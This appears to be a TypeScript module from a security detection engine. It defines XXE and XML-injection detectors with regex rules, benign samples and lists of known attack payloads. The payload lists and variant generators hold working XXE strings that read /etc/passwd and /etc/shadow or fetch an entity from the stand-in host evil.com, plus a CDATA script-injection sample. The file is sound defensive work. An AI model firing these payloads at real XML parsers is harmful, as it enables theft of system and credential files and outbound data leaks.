/**
 * XXE + XML Injection classes
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'
import { l2XMLInjection, l2XxeEvaluator } from '../../evaluators/l2-adapters.js'

export const xxeEntityExpansion: InvariantClassModule = {
    id: 'xxe_entity_expansion',
    description: 'XML External Entity injection — DTD entity definitions referencing external resources',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.92 },

    mitre: ['T1190'],
    cwe: 'CWE-611',

    knownPayloads: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>',
    ],

    knownBenign: [
        '<root><item>data</item></root>',
        '<?xml version="1.0"?><doc/>',
        '<html><body>hello</body></html>',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /<!(?:DOCTYPE|ENTITY)\s+(?:%\s+)?\S+\s+(?:SYSTEM|PUBLIC)\s+["'][^"']*["']/i.test(d)
            || /<!ENTITY\s+(?:%\s+)?\S+\s+["'](?:file:|http:|ftp:|php:|expect:|data:)/i.test(d)
            || /<!ENTITY\s+(?:%\s+)?\S+\s+SYSTEM/i.test(d)
            // Recursive/billion-laughs entity expansion: entities referencing other entities inside DOCTYPE
            || /<!DOCTYPE\s+\S+\s*\[(?:[^>]*<!ENTITY[^>]*>){2,}/i.test(d)
    },
    detectL2: l2XxeEvaluator,
    generateVariants: (count: number): string[] => {
        const v = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>',
        ]
        return v.slice(0, count)
    },
}

export const xmlInjection: InvariantClassModule = {
    id: 'xml_injection',
    description: 'XML injection — unescaped XML metacharacters or CDATA injection in user input',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.70 },

    mitre: ['T1190'],
    cwe: 'CWE-91',

    knownPayloads: [
        '<![CDATA[<script>alert(1)</script>]]>',
        '<!DOCTYPE test [<!ENTITY foo "bar">]>',
        '<x>&custom_entity;</x>',
    ],

    knownBenign: [
        '<item>test</item>',
        '<name>John &amp; Jane</name>',
        '&lt;tag&gt;',
        'AT&amp;T',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /<!(?:DOCTYPE|ENTITY)/i.test(d)
            || /<!\[CDATA\[.*\]\]>/i.test(d)
            || /&(?!amp;|lt;|gt;|quot;|apos;|#)\w+;/.test(d)
    },
    detectL2: l2XMLInjection,
    generateVariants: (count: number): string[] => {
        const v = ['<![CDATA[<script>alert(1)</script>]]>', '<!DOCTYPE test [<!ENTITY foo "bar">]>',
            '<x>&custom_entity;</x>']
        return v.slice(0, count)
    },
}
